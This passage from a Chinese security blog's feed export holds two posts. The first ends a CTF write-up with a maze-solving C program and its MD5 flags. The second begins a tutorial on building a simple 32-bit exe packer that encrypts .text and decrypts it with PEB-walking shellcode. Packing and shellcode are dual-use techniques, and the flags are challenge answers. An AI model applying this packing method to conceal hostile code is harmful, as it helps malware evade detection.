class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, &#125;, &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mark[<span class="number">40</span>][<span class="number">40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> way[<span class="number">400</span>];</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>[x][y] == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nway: %s\n&quot;</span>, way);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>, index);</span><br><span class="line"><span class="comment">//exit(0);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> xnew = <span class="number">0</span>, ynew = <span class="number">0</span>;</span><br><span class="line">check(x, y);<span class="comment">//判断走到终点。</span></span><br><span class="line"></span><br><span class="line">xnew = x - <span class="number">1</span>;</span><br><span class="line">ynew = y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">40</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">40</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)<span class="comment">//不能越界，不能撞墙，不能走以访问路线。</span></span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;w&#x27;</span>;<span class="comment">//保存路线，以便输出路线。</span></span><br><span class="line">mark[x][y] = <span class="number">1</span>;<span class="comment">//标记以访问路线，避免重复访问。</span></span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;<span class="comment">//如果该路不能到达终点，回溯时要将标记还原。</span></span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;<span class="comment">//路线走不通，还原。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x;</span><br><span class="line">ynew = y + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">40</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">40</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x + <span class="number">1</span>;</span><br><span class="line">ynew = y;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">40</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">40</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x;</span><br><span class="line">ynew = y - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">40</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">40</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;%d %d \n&quot;, map[24][25], map[20][23]);</span></span><br><span class="line"><span class="built_in">map</span>[<span class="number">24</span>][<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//map[20][23] = 1;</span></span><br><span class="line">dfs(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得道最短路径：sdsdddwdddsssssaassdddddddwdddsssddddsssddssssssdsssddsssassdddwwwwwwwddddssdsssdsssssaaasssdsddddwddssssd<br>然后进行md5加密，套上D0g3{}</p><p>由于键盘钩取无法确定字符串的大小写问题，所以默认全部大写，或者默认全部小写。</p><p>全部大写的flag：D0g3{1bf4c14e20c7f8559f0c72ad4605c8d5}</p><p>全部小写的flag: D0g3{53df848a34fe32ec80b67f8f082928e9}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 出题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Simple Exe Packing</title>
      <link href="2022/03/30/Simple%20Exe%20Packing/"/>
      <url>2022/03/30/Simple%20Exe%20Packing/</url>
      
        <content type="html"><![CDATA[<h1 id="Simple-Exe-Packing"><a href="#Simple-Exe-Packing" class="headerlink" title="Simple Exe Packing"></a>Simple Exe Packing</h1><p>本文章介绍最简单的32位exe程序加壳流程。本来是在寒假就已经写好了很大一部分代码，但是由于vs属性配置不起作用的原因，导致写的shellcode没法使用，也是最近才解决掉这个问题。</p><p>通过编写一个壳，可以对pe结构和程序执行过程有更深入的了解，而且这个壳的思路都是最简单的一种，只要shellcode厉害，壳就可以更能隐藏程序的信息。</p><p>代码已经上传到github上，<a href="https://github.com/The-Itach1/Simple-Exe-Packing">https://github.com/The-Itach1/Simple-Exe-Packing</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h3><p>对pe结构体还是必须要有个大概的了解，不说能背，至少在peview工具中看到名称知道一些关机的结构体和其成员代表什么需要知道，还有exe在内存和在磁盘的区别已经如何转换。特别是对于IMAGE_EXPORT_DIRECTORY导出表和IMAGE_BASE_RELOCATION重定位表，实际上我在Windows-Hack-Programming的编程练习中，已经对这个很熟悉了。IMAGE_EXPORT_DIRECTORY导出表可能还没提到过，一般就是dll程序的导出函数的信息存储地方，由于我们要编写shellcode，所以需要获得kernel32.dll的一些导出函数，需要用到这个表。</p><h3 id="如何编写shellcode"><a href="#如何编写shellcode" class="headerlink" title="如何编写shellcode"></a>如何编写shellcode</h3><p>首先shellcode是可以在其他设备(windows)上也可以直接使用的，因为不会涉及到全局变量，并且调用的函数也必须是从kernel32.dll中直接寻找到，这是因为重定位的关系，程序加载的api函数的地址都是不固定的，一般是先找到GetProcAddress和GetModuleHandle和LoadLibrary，这样就可以基本上获取到其他所有函数。</p><p>通过peb获取kernel32基址：<br><a href="https://bbs.pediy.com/thread-266678.htm?msclkid=51ec2fddaf6711ec9ca04b75cc507387">https://bbs.pediy.com/thread-266678.htm?msclkid=51ec2fddaf6711ec9ca04b75cc507387</a></p><h3 id="解决vs的栈检测和优化"><a href="#解决vs的栈检测和优化" class="headerlink" title="解决vs的栈检测和优化"></a>解决vs的栈检测和优化</h3><p>在关闭了vs的安全检测和优化后，还是发现了栈检测的问题，并且在release编译环境下，仍可能会将简单的异或运算进行优化，优化为128bit的异或运算，并且将异或值设置为全局变量。最后的解决方法就是使用Debug模式编译，然后在ida中手动删除掉其中的栈检测汇编代码。</p><h2 id="加壳思路"><a href="#加壳思路" class="headerlink" title="加壳思路"></a>加壳思路</h2><p>算是最基础的一种加壳思路了。</p><ul><li>添加一个节区，用来装载解密.text节区的shellcode。</li><li>加密.text节区，实际上应该还可以加密.idata节区。</li><li>编写shellcode，用来解密.text节区。</li><li>将shellcode写入添加的节区。</li></ul><p>当然，shellcode的编写需要另外写一个项目。</p><h2 id="代码展示"><a href="#代码展示" class="headerlink" title="代码展示"></a>代码展示</h2><p>这里也不详细介绍过程了，完全可以通过代码和代码中的注释来弄清流程。</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* GETPROCADDRESS)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">LPCSTR  lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* GETMODULEHANDLEA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPCSTR lpModuleName</span></span></span><br><span class="line"><span class="function"><span 